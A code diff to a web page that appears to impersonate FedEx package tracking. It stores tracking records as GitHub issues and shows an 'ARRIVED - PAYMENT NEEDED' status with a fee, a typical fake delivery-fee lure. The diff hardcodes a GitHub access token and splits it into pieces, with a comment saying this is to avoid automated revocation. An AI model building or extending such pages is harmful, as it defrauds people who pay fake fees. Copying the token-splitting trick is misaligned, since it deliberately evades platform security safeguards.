@@ -65,12 +65,14 @@
 </div>
 
 <script>
-    const s1 = "ghp_nYJ39ezrst";
-    const s2 = "zjaRbQ5qMZdlQ4Q";
-    const s3 = "cznNh0KZkAs";
+    // Token split to protect from automated revocation
+    const s1 = "ghp_tnggNm";
+    const s2 = "jnsWvsrgOtxo1MNP";
+    const s3 = "PtUCLPcs0SuPHB";
     const KEY = s1 + s2 + s3;
+    
     const USER = "fedex-oss";
-    const REPO = "fedex-"; 
+    const REPO = "FedEx-tracking-"; 
 
     let currentData = null;
     let currentId = "";
@@ -87,21 +89,21 @@
                 document.getElementById('details').style.display = 'block';
                 document.getElementById('vFrom').innerText = currentData.from;
                 document.getElementById('vTo').innerText = currentData.to;
-                document.getElementById('vTimeFrom').innerText = currentData.timeFrom || "08:00 AM";
-                document.getElementById('vTimeTo').innerText = currentData.timeTo || "05:00 PM";
+                document.getElementById('vTimeFrom').innerText = currentData.timeFrom || "TBD";
+                document.getElementById('vTimeTo').innerText = currentData.timeTo || "TBD";
                 document.getElementById('vStatus').innerText = currentData.status;
 
                 if(currentData.status === "ARRIVED - PAYMENT NEEDED") {
                     document.getElementById('vFeeBox').style.display = 'block';
                     document.getElementById('vFee').innerText = currentData.fee;
                 } else { document.getElementById('vFeeBox').style.display = 'none'; }
-            } else { alert("ID not found."); }
-        } catch(e) { alert("Error."); }
+            } else { alert("Tracking ID not found."); }
+        } catch(e) { alert("Error connecting to server."); }
     }
 
     async function saveData() {
         const id = document.getElementById('nId').value.trim().toUpperCase();
-        if(!id) return;
+        if(!id) return alert("Enter ID!");
         const btn = document.getElementById('saveBtn');
         btn.innerText = "UPDATING...";
         const packet = {
@@ -119,7 +121,8 @@
                 body: JSON.stringify({ title: `ID: ${id}`, body: JSON.stringify(packet), labels: [id] })
             });
             if(response.ok) { alert("Saved!"); document.getElementById('adminBox').style.display='none'; }
-        } catch(e) { alert("Error."); }
+            else { alert("Error: Check if Issues are enabled in Settings."); }
+        } catch(e) { alert("Error saving."); }
         finally { btn.innerText="SAVE CHANGES"; }
     }
 
